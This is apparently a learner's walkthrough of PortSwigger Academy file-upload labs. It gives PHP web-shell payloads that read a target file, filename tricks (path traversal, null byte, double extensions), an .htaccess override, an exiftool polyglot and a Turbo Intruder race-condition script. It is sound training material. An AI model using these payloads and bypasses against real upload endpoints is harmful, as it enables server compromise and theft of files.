# Portswigger
## File Upload Vulnerabilities
### Remote code execution via web shell upload
```bash

Target directory /home/carlos/secret 
Submit this secret using the button provided in the lab banner. 
You can log in to your own account using the following credentials: wiener:peter

Change

<?php echo file_get_contents('/path/to/target/file'); ?>

To

<?php echo file_get_contents('/home/carlos/secret'); ?>

Upload the file

It states file is located @ 'avatar/file.php'

Go to: Home
Intercept is on
Intercept "View post"

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /files/avatars/file.php HTTP/1.1

//or//

Go directly to /files/avatars/file.php
It never specifies that you will find the /avatars/file.php in the "/files" directory

https://ac731f5f1f1a8eb0c07226a700f5005f.web-security-academy.net/files/avatars/file.php

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220504184236.png)
![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220504184557.png)

### Web shell upload via Content-Type restriction bypass
- only accepts .jpeg or .png files unless changed in Burp repeater
```bash

Target directory /home/carlos/secret 
Submit this secret using the button provided in the lab banner. 
You can log in to your own account using the following credentials: wiener:peter

Change

<?php echo file_get_contents('/path/to/target/file'); ?>

To

<?php echo file_get_contents('/home/carlos/secret'); ?>

Intercept is on
Upload the file as a .jpeg or .png file
Send to repeater
Change

Content-Disposition: form-data; name="avatar"; filename="file.jpeg"

to

Content-Disposition: form-data; name="avatar"; filename="file.php"

It states file is located @ 'avatar/file.jpeg'
Since the file extension was changed it should be found at 'avatar/file.php'

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "View details"

Forward the proxy twice until you see:

GET /files/avatars/file.php HTTP/1.1

//or//

Go directly to /files/avatars/file.php
It never specifies that you will find the /avatars/file.php in the "/files" directory

https://ac731f5f1f1a8eb0c07226a700f5005f.web-security-academy.net/files/avatars/file.php

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220504192559.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220504193134.png)
### Web shell upload via path traversal
```bash

Target directory /home/carlos/secret 
Submit this secret using the button provided in the lab banner. 
You can log in to your own account using the following credentials: wiener:peter
Also chain exploits w/ directory traversal

Change

<?php echo file_get_contents('/path/to/target/file'); ?>

To

<?php echo file_get_contents('/home/carlos/secret'); ?>

Intercept is on
Upload the file

Change

Content-Disposition: form-data; name="avatar"; filename="file.php"

to emulate directory traversal add .. + %2f (url-encode of a '/')

Content-Disposition: form-data; name="avatar"; filename="..%2ffile.php"

It states file is located @ 'avatar/file.php'

Instead of

https://ac6b1fd71e2a399bc04ca9d600d70086.web-security-academy.net/files/avatars/file.php

The response of the command will be found:

https://ac6b1fd71e2a399bc04ca9d600d70086.web-security-academy.net/files/file.php

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220504200619.png)

### Web shell upload via extension blacklist bypass
- Insufficient black-listing of file extensions
	- php denied, but .php5 and .shtml accepted
- Overriding the server configuration
	- "Before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their '/etc/apache2/apache2.conf' file."
		- LoadModule php_module /usr/lib/apache2/modules/libphp.so
		- AddType application/x-httpd-php .php
	- "Many servers allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings."
	- Apache servers example:
		- .htaccess
	- "Similarly, developers can make directory-specific configuration on IIS servers using a web.config file."
```bash

Target directory /home/carlos/secret 
Submit this secret using the button provided in the lab banner. 
You can log in to your own account using the following credentials: wiener:peter
Also chain exploits w/ directory traversal

Change

<?php echo file_get_contents('/path/to/target/file'); ?>

To

<?php echo file_get_contents('/home/carlos/secret'); ?>

Intercept is on 
After testing the .php extension to no avail I found the .php5 and .shtml extensions worked
Send to repeater

After sending the inital .php5 // .shtml extensions change the filename to ".htaccess" and add the following:

AddType application/x-httpd-php .php5

Go to:

GET /files/avatars/file.php5 HTTP/1.1

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220505175454.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220505175626.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220505175650.png)

### Web shell upload via obfuscated file extension
```bash

- Some obfuscating shell upload techniques consist of:
	- file.pHp
	- file.php.jpg
	- file.php;.jpg
	- file.asp%00.jpg
	- "Multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization."
		- "Sequences like xc0 x2E, xC4 xAE or xC0 xAE may be translated to XE2"
	- file.p.phphp

Target directory /home/carlos/secret 
Submit this secret using the button provided in the lab banner. 
You can log in to your own account using the following credentials: wiener:peter
Also chain exploits w/ directory traversal

Change

<?php echo file_get_contents('/path/to/target/file'); ?>

To

<?php echo file_get_contents('/home/carlos/secret'); ?>

Intercept is on 
Send to repeater
After testing the .php extension to no avail I found the '.php%00.jpg', 'file.php;.jpg' and 'file.php.jpg' extensions all returned:

HTTP/1.1 200 OK

The only successful attempt used the '.php%00.jpg' extension

Content-Disposition: form-data; name="avatar"; filename="file.php%00.jpg"

Go to:
Home
Intercept is on
"View post"
Send to repeater 

GET /files/avatars/file.php HTTP/1.1

//or//
Go directly to location in browser

https://ac921f561f0a1ee0c0d88304003500e0.web-security-academy.net/files/avatars/file.php

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220505182405.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220505183119.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220505183142.png)

### Remote code execution via polyglot web shell upload
- "Instead of implicitly trusting the 'Content-Type' specified in a request, more secure servers try to verify that the contents of the file actually match what is expected."
	- An example being image dimensions
		- JPEG always begin with "FF D8 FF" bytes
```bash

If exiftool is not installed on linux system
Install program
sudo apt install libimage-exiftool-perl

View all the metadata for specified photo

exiftool image.jpeg

Delete all metadata for specified photo // do not execute this on photo used (useful for clearing personal metadata from photo(s))

exiftool -all=image.jpeg

Choose photo

cp image.jpeg polyglot.jpeg

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" polyglot.jpeg -o polyglot.php

Upload "polyglot.php"

Go to:

https://acbe1f961e765f23c0ede19700e200e9.web-security-academy.net/files/avatars/polyglot.php

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220505222347.png)

### Web shell upload via race condition
```bash

Target directory /home/carlos/secret 
Submit this secret using the button provided in the lab banner. 
You can log in to your own account using the following credentials: wiener:peter
Also chain exploits w/ directory traversal

Change

<?php echo file_get_contents('/path/to/target/file'); ?>

To

<?php echo file_get_contents('/home/carlos/secret'); ?>

If turbo intruder is not installed go to BAapp store and install it
Intercept is on 
Upload "file.php"
Only .png and .jpg file extensions are accepted from previous trial and error
Append "file.php.png" to the end of the filename in the POST:

Content-Disposition: form-data; name="avatar"; filename="file.php.png"

Be aware that when you find this in the "HTTP history" the .png extension will no longer be there

Right click -> Highlight

Go to:
In "HTTP history"

GET /files/avatars/clown.php.png HTTP/1.1

Right click -> Highlight
Go back to the POST request
Right click -> Turbo Intruder -> Send to turbo intruder
In the drop down menu there will be an option "examples/race.py"

The code below is an example. Some notable mentions:

The initial few lines should have 'concurrentConnections=20' note the # 

Add in request1 = "POST", request2 = "Get\r\n"

Note the escape characters at the end of the "GET" request i.e. the request2 variable
Lower the for loop to 5 instead of 30
Add above the for loop:

engine.queue(request1, gate='race1')

Below the for loop:

engine.queue(request2, gate='race1')

Hit attack at the bottom and look for "200" responses

```

### Continued (race conditions) final payload...
```python

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: ac3b1f291e83171ac0b8a6a400680062.web-security-academy.net
Cookie: session=6QANEtWspmJnotAZWeaMu2b0JnNoeZbQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------40396962506101427813186500673
Content-Length: 536
Origin: https://ac3b1f291e83171ac0b8a6a400680062.web-security-academy.net
Referer: https://ac3b1f291e83171ac0b8a6a400680062.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------40396962506101427813186500673
Content-Disposition: form-data; name="avatar"; filename="clown.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------40396962506101427813186500673
Content-Disposition: form-data; name="user"

wiener
-----------------------------40396962506101427813186500673
Content-Disposition: form-data; name="csrf"

IjSwEznpGuziqcR53SDnx54m3SfQ04SG
-----------------------------40396962506101427813186500673--
'''

    request2 = '''
GET /files/avatars/clown.php HTTP/1.1
Host: ac3b1f291e83171ac0b8a6a400680062.web-security-academy.net
Cookie: session=6QANEtWspmJnotAZWeaMu2b0JnNoeZbQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac3b1f291e83171ac0b8a6a400680062.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
If-Modified-Since: Fri, 06 May 2022 23:57:35 GMT
If-None-Match: "38-5de609f60c6b3"
Te: trailers
Connection: close\r\n
'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for i in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220506191546.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220506191916.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220506192203.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220506192529.png)

#hacking
